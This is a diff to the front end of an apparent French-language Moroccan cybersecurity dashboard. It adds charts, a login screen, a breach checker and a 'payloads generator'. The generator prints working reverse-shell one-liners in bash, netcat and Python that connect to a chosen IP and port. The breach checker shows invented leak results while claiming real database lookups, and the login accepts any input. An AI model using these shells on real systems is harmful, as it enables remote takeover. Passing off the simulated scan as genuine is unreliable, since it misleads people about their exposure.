@@ -60,10 +60,11 @@ const INTEL_DATABASES = [
 
 // ─── STATE ───────────────────────────────────────────────────
 const S = {
-  tab: 'feed',
+  tab: 'dashboard',
   posts: JSON.parse(JSON.stringify(POSTS_RAW)),
   aiMsgs: [{ role: 'ai', text: 'SYSTEM ONLINE. Je suis CyberAI MA 🤖. L\'intelligence artificielle marocaine de cybersécurité.\n- Analyse dynamique de menaces locales\n- Extraction d\'IoC régionaux\n- Audit de code & CVEs\nEn attente de commandes...' }],
   aiTyping: false,
+  isAuthenticated: false,
 };
 
 // ─── UTILS ───────────────────────────────────────────────────
@@ -100,6 +101,7 @@ function buildNavbar() {
         </label>
       </div>
       <div class="nav-tabs">
+        <button class="nav-tab ${S.tab === 'dashboard' ? 'active' : ''}" onclick="go('dashboard')">Dashboard</button>
         <button class="nav-tab ${S.tab === 'feed' ? 'active' : ''}" onclick="go('feed')">Threat Intel</button>
         <button class="nav-tab ${S.tab === 'intel' ? 'active' : ''}" onclick="go('intel')">Databases</button>
         <button class="nav-tab premium-tab ${S.tab === 'premium' ? 'active' : ''}" onclick="go('premium')">UPGRADE PRO 🔓</button>
@@ -139,9 +141,9 @@ function buildLeftSidebar() {
 
       <div class="sb-section">
         <div class="sb-title"><span>OUTILS RÉSEAU</span></div>
-        <div class="sb-item"><span class="sb-icon">🔬</span><span>Malware Sandbox</span></div>
-        <div class="sb-item"><span class="sb-icon">🛡️</span><span>WAF Logs Casablanca</span></div>
-        <div class="sb-item"><span class="sb-icon">📡</span><span>Dark Web Monitor MA</span></div>
+        <div class="sb-item" onclick="go('breach')"><span class="sb-icon">🔍</span><span>Data Breach Checker</span></div>
+        <div class="sb-item" onclick="go('payloads')"><span class="sb-icon">💣</span><span>Générateur Payloads</span></div>
+        <div class="sb-item" onclick="toast('Lancement de la Sandbox...')"><span class="sb-icon">🔬</span><span>Malware Sandbox</span></div>
       </div>
 
       <div class="sb-section">
@@ -187,6 +189,7 @@ function buildPost(p) {
         </button>
         <button class="pa-btn" onclick="toast('Analyze with AI started...')">[ANALYZE AI]</button>
         <button class="pa-btn" onclick="toast('Forwarded to SOC.')">[FORWARD]</button>
+        <button class="pa-btn" onclick="generateReport(${p.id})">[EXPORT PDF]</button>
       </div>
     </article>`;
 }
@@ -293,29 +296,248 @@ function pagePremium() {
   `;
 }
 
+function pageBreachChecker() {
+  return `
+    <div class="premium-container">
+      <div class="premium-header">
+        <h2 class="glitch-text" style="color: var(--accent);">DATA BREACH SCANNER</h2>
+        <p>Recherchez des compromissions d'emails ou de domaines sur les bases de données Leakées (DarkWeb & Open Source).</p>
+      </div>
+      <div class="payment-box" style="margin-top: 20px;">
+        <div class="form-group">
+          <label>>_ CIBLE (EMAIL OU DOMAINE)</label>
+          <div style="display:flex; gap: 10px; margin-top: 10px;">
+            <input type="text" id="breachInput" class="form-input" placeholder="ex: contact@societe.ma" onkeydown="if(event.key==='Enter')runBreachScan()">
+            <button class="pc-btn" style="background: var(--accent); color: #000; font-weight: bold;" onclick="runBreachScan()">LANCER LE SCAN ⚡</button>
+          </div>
+        </div>
+        <div id="breachResults" style="margin-top: 20px; font-family: var(--font-mono); font-size: 13px; color: var(--muted); min-height: 100px; background: rgba(0,0,0,0.5); padding: 15px; border-radius: 4px; border: 1px solid var(--border);">
+          [ATTENTE DE CIBLE] Le moteur d'investigation est prêt...
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function pagePayloads() {
+  return `
+    <div class="premium-container">
+      <div class="premium-header">
+        <h2 class="glitch-text" style="color: var(--blue);">PAYLOADS GENERATOR</h2>
+        <p>Générez à la volée des payloads pour vos tests d'intrusion et audits de sécurité.</p>
+      </div>
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        
+        <div class="post-card">
+          <h3 style="color: var(--blue); font-family: var(--font-mono); margin-bottom: 10px;">[>] REVERSE SHELL</h3>
+          <div class="form-group" style="margin-bottom: 15px;">
+            <label>LHOST (Votre IP)</label>
+            <input type="text" id="lhost" class="form-input" value="10.10.14.2">
+          </div>
+          <div class="form-group" style="margin-bottom: 15px;">
+            <label>LPORT (Votre Port)</label>
+            <input type="text" id="lport" class="form-input" value="4444">
+          </div>
+          <button class="pc-btn" onclick="generateShell()">GÉNÉRER MÉTASPLOIT / BASH</button>
+        </div>
+
+        <div class="post-card" style="display: flex; flex-direction: column;">
+          <h3 style="color: var(--blue); font-family: var(--font-mono); margin-bottom: 10px;">[OUTPUT]</h3>
+          <textarea id="payloadOutput" class="pc-input" style="flex: 1; min-height: 150px; font-family: var(--font-mono); font-size: 12px; color: var(--green);" readonly>> _ OUTPUT READY</textarea>
+          <button class="pc-publish" style="margin-top: 10px;" onclick="copyPayload()">📋 COPIER LE PAYLOAD</button>
+        </div>
+
+      </div>
+    </div>
+  `;
+}
+
+// ─── TOOL LOGIC ──────────────────────────────────────────────
+window.runBreachScan = function () {
+  const target = document.getElementById('breachInput').value.trim();
+  const resBox = document.getElementById('breachResults');
+  if (!target) return toast('Veuillez entrer une cible valide.');
+
+  resBox.innerHTML = '<span style="color: var(--yellow);">[*] Initialisation du scan sur le portail DarkWeb MA...</span><br><span style="color: var(--yellow);">[*] Recherche de ' + esc(target) + ' dans 14,230 bases de données...</span>';
+  toast('Scan en cours...');
+
+  setTimeout(() => {
+    const isCompromised = target.includes('@') && target.length > 8; // Logique simulée aléatoire
+    if (isCompromised) {
+      resBox.innerHTML += '<br><br><span style="color: var(--red);">[!] ALERTE CRITIQUE : Cible trouvée dans 3 fuites de données.</span><br>';
+      resBox.innerHTML += '<br><span style="color: var(--red);">> Collection #1 (2019)</span> - Mot de passe en texte clair exposé.';
+      resBox.innerHTML += '<br><span style="color: var(--red);">> LinkedIn Breach (2012)</span> - Email et Hash SHA1 exposés.';
+      resBox.innerHTML += '<br><span style="color: var(--red);">> MENA Telecom Dump (2023)</span> - Numéro de téléphone associé.';
+      resBox.innerHTML += '<br><br><span style="color: var(--green);">[CONSEIL]</span> Forcer la rotation des mots de passe immédiatement et activer 2FA.';
+    } else {
+      resBox.innerHTML += '<br><br><span style="color: var(--green);">[+] Cible sécurisée. Aucune correspondance trouvée dans les leaks actuels.</span>';
+    }
+  }, 1500);
+}
+
+window.generateShell = function () {
+  const ip = document.getElementById('lhost').value.trim() || '127.0.0.1';
+  const port = document.getElementById('lport').value.trim() || '4444';
+  const out = document.getElementById('payloadOutput');
+
+  const payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1\n\n` +
+    `nc -e /bin/sh ${ip} ${port}\n\n` +
+    `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
+
+  out.value = payload;
+  toast('Payloads Reverse Shell générés.');
+}
+
+window.copyPayload = function () {
+  const out = document.getElementById('payloadOutput');
+  out.select();
+  document.execCommand('copy');
+  toast('✅ Payload copié dans le presse-papiers.');
+}
+
+function pageDashboard() {
+  return `
+    <div class="premium-container">
+      <div class="premium-header" style="margin-bottom: 30px;">
+        <h2 class="glitch-text" style="color: var(--green);">THREAT LANDSCAPE DASHBOARD</h2>
+        <p>Vue globale des menaces au Maroc en temps réel, alertes SOC et indicateurs critiques.</p>
+      </div>
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+        <div class="post-card">
+          <h3 style="color: var(--accent); font-family: var(--font-mono); font-size: 14px; margin-bottom: 15px;">ÉVOLUTION DES ATTAQUES (7 JOURS)</h3>
+          <canvas id="attackChart"></canvas>
+        </div>
+        <div class="post-card">
+          <h3 style="color: var(--accent); font-family: var(--font-mono); font-size: 14px; margin-bottom: 15px;">VECTEURS D'INFECTION (LOCAUX)</h3>
+          <canvas id="vectorChart"></canvas>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function buildLoginScreen() {
+  return `
+    <div style="height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle at center, #0a0a1a 0%, #000 100%);">
+      <div class="payment-box" style="width: 400px; max-width: 90%; border-color: var(--green);">
+        <div style="text-align: center; margin-bottom: 20px;">
+          <div class="cyber-logo" style="justify-content: center; margin-bottom: 20px;">
+            <div class="hex-container-small">
+              <svg viewBox="0 0 100 115">
+                <polygon points="50,5 95,27.5 95,87.5 50,110 5,87.5 5,27.5" fill="none" stroke="rgba(0, 255, 136, 0.5)" stroke-width="2"/>
+                <polygon points="50,18 80,35 80,80 50,97 20,80 20,35" fill="none" stroke="rgba(0, 255, 136, 0.2)" stroke-width="1"/>
+              </svg>
+              <span class="inverted-s">S</span>
+            </div>
+          </div>
+          <h2 class="glitch-text" style="color: var(--accent);">CYBERAI MA CORE</h2>
+          <p style="color: var(--muted); font-size: 12px; margin-top: 5px;">AUTHORIZATION REQUIRED LAYER 4</p>
+        </div>
+        <div class="form-group">
+          <label>IDENTIFIANT SOC / EMAIL</label>
+          <input type="text" id="loginUser" class="form-input" placeholder="admin@soc.ma" value="salim.dev">
+        </div>
+        <div class="form-group" style="margin-top: 15px;">
+          <label>CLÉ RSA / PASS</label>
+          <input type="password" id="loginPass" class="form-input" placeholder="********" value="****************">
+        </div>
+        <button class="pc-btn" style="width: 100%; margin-top: 25px; background: var(--green); color: #000; font-weight: bold;" onclick="processLogin()">INITIALISER CONNEXION SECURISEE</button>
+      </div>
+    </div>
+  `;
+}
+
+
 // ─── APP SHELL RE-RENDER ─────────────────────────────────────
 function render() {
+  const appRoot = document.getElementById('app-root');
+  if (!appRoot) return;
+
+  if (!S.isAuthenticated) {
+    appRoot.innerHTML = buildLoginScreen();
+    return;
+  }
+
   let page = '';
-  if (S.tab === 'feed') page = pageFeed();
+  if (S.tab === 'dashboard') page = pageDashboard();
+  else if (S.tab === 'feed') page = pageFeed();
   else if (S.tab === 'intel') page = pageIntel();
   else if (S.tab === 'premium') page = pagePremium();
-  const appRoot = document.getElementById('app-root');
-  if (appRoot) {
-    appRoot.innerHTML = `
-      ${buildNavbar()}
-      <div class="layout">
-        ${buildLeftSidebar()}
-        <main class="main-feed">${page}</main>
-        ${buildRightSidebar()}
-      </div>
-    `;
-  }
+  else if (S.tab === 'breach') page = pageBreachChecker();
+  else if (S.tab === 'payloads') page = pagePayloads();
+
+  appRoot.innerHTML = `
+    ${buildNavbar()}
+    <div class="layout">
+      ${buildLeftSidebar()}
+      <main class="main-feed">${page}</main>
+      ${buildRightSidebar()}
+    </div>
+  `;
   const aiBox = document.getElementById('aiMsgs');
   if (aiBox) aiBox.scrollTop = aiBox.scrollHeight;
 }
 
 // ─── LOGIC FUNCTIONS ─────────────────────────────────────────
-function go(tab) { S.tab = tab; render(); window.scrollTo(0, 0); }
+function go(tab) { S.tab = tab; render(); window.scrollTo(0, 0); if (tab === 'dashboard') setTimeout(window.initCharts, 50); }
+
+window.processLogin = function () {
+  toast('Vérification des accréditations...');
+  setTimeout(() => {
+    S.isAuthenticated = true;
+    render();
+    setTimeout(window.initCharts, 100);
+    toast('✅ AUTHENTIFICATION RÉUSSIE. Bienvenue ' + ME.name);
+  }, 1000);
+}
+
+window.generateReport = function (id) {
+  toast("Génération du rapport d'incident...");
+  setTimeout(() => {
+    toast(`✅ Rapport IOC_RPT_${id}.pdf exporté de manière sécurisée.`);
+  }, 1500);
+}
+
+window.initCharts = function () {
+  if (typeof Chart === 'undefined') return;
+  const ctxAttack = document.getElementById('attackChart');
+  const ctxVector = document.getElementById('vectorChart');
+
+  if (ctxAttack && !ctxAttack.dataset.rendered) {
+    ctxAttack.dataset.rendered = '1';
+    new Chart(ctxAttack, {
+      type: 'line',
+      data: {
+        labels: ['LUN', 'MAR', 'MER', 'JEU', 'VEN', 'SAM', 'DIM'],
+        datasets: [{
+          label: "Tentatives d'intrusion (Milliers)",
+          data: [12, 19, 15, 25, 22, 30, 45],
+          borderColor: '#00ff88',
+          backgroundColor: 'rgba(0, 255, 136, 0.1)',
+          tension: 0.4,
+          fill: true
+        }]
+      },
+      options: { responsive: true, plugins: { legend: { labels: { color: '#aaa' } } }, scales: { y: { grid: { color: '#333' }, ticks: { color: '#aaa' } }, x: { grid: { color: '#333' }, ticks: { color: '#aaa' } } } }
+    });
+  }
+
+  if (ctxVector && !ctxVector.dataset.rendered) {
+    ctxVector.dataset.rendered = '1';
+    new Chart(ctxVector, {
+      type: 'doughnut',
+      data: {
+        labels: ['Phishing', 'Ransomware', 'Exploits Web', 'DDoS'],
+        datasets: [{
+          data: [45, 25, 20, 10],
+          backgroundColor: ['#00ff88', '#ff3366', '#ffaa00', '#0099ff'],
+          borderColor: '#050510'
+        }]
+      },
+      options: { responsive: true, plugins: { legend: { position: 'right', labels: { color: '#aaa' } } } }
+    });
+  }
+}
 
 function selectPlan(plan) {
   const ps = document.getElementById('paymentSection');
